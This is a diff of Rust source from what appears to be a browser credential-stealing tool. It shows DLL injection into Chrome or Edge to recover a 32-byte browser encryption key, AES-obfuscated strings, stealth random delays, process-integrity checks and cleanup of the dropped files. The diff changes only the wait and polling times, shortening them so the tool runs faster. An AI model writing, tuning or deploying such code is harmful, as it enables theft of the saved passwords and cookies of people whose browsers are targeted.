@@ -513,8 +513,8 @@ fn spawn_chrome_and_inject(chrome_exe: &str, dll_path: &Path, real_profile: &Pat
         // Edge needs more startup time than Chrome — poll with early exit
         let edge_name = aes_decrypt(&polymorphic_keys::INJ_EDGE_EXE_ENC, &polymorphic_keys::INJ_EDGE_EXE_KEY, &polymorphic_keys::INJ_EDGE_EXE_NONCE);
         let exe_basename = std::path::Path::new(chrome_exe).file_name().map(|f| f.to_string_lossy().to_lowercase()).unwrap_or_default();
-        let wait_ms = if exe_basename.as_bytes() == edge_name.as_slice() { 5000u64 } else { 3000u64 };
-        let step = 500u64;
+        let wait_ms = if exe_basename.as_bytes() == edge_name.as_slice() { 2000u64 } else { 1200u64 };
+        let step = 200u64;
         let mut elapsed = 0u64;
         while elapsed < wait_ms {
             std::thread::sleep(std::time::Duration::from_millis(step));
@@ -566,7 +566,7 @@ pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
     let mut cleanup = Cleanup::new();
     cleanup.track_file(dll_path.clone());
     cleanup.track_file(result_path.clone());
-    stealth::random_delay(100, 1000);
+    stealth::random_delay(50, 150);
     if !stealth::check_process_integrity() { return None; }
     dynapi::init();
     if fs::write(&dll_path, payload_dll).is_err() { return None; }
@@ -622,13 +622,13 @@ pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
     };
     if !injected { return None; }
 
-    for _i in 0..60 {
+    for _i in 0..20 {
         if result_path.exists() {
             if let Some(key) = read_key_from_result(&result_path) {
                 if key.len() == 32 { return Some(key); }
             }
         }
-        std::thread::sleep(std::time::Duration::from_millis(500));
+        std::thread::sleep(std::time::Duration::from_millis(200));
     }
 
     None
